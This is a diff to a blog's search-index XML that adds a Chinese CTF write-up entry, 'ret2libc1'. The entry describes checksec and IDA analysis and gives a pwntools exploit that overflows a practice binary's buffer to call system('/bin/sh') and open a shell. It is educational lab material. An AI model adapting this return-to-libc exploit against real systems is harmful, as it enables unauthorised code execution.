@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>ret2libc1</title>
+      <link href="/2022/01/11/ret2libc1/"/>
+      <url>/2022/01/11/ret2libc1/</url>
+      
+        <content type="html"><![CDATA[<ul><li><p>checksec</p><img src="/2022/01/11/ret2libc1/checksec.png" alt="image-20220111154452445" style="zoom:80%;"></li><li><p>运行</p><img src="/2022/01/11/ret2libc1/run.png" alt="image-20220111184726541" style="zoom:80%;"></li><li><p>拖入IDA分析</p><p>通过ALT+T</p><p>可以发现system和bin/sh</p></li><li><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"> 1 from pwn import *                                                            2 log_level = 'debug' 3 elf = ELF("./ret2libc1") 4   5 local = 1 6   7 if local: 8     r = process("./ret2libc1") 9 else:10     r = remote("")11 bin_sh = 0x0804872012 system_addr = 0x0804861113 system_plt = 0x0804846014 # payload = b'a'*112 + p32(system_addr) + p32(bin_sh)15 payload = flat(['a'*112,p32(system_plt),'b'*4,p32(bin_sh)])16  17 r.sendline(payload)18  19 r.interactive()  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pwn </tag>
+            
+            <tag> 二进制 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>ret2syscall</title>
       <link href="/2022/01/11/ret2syscall/"/>
       <url>/2022/01/11/ret2syscall/</url>
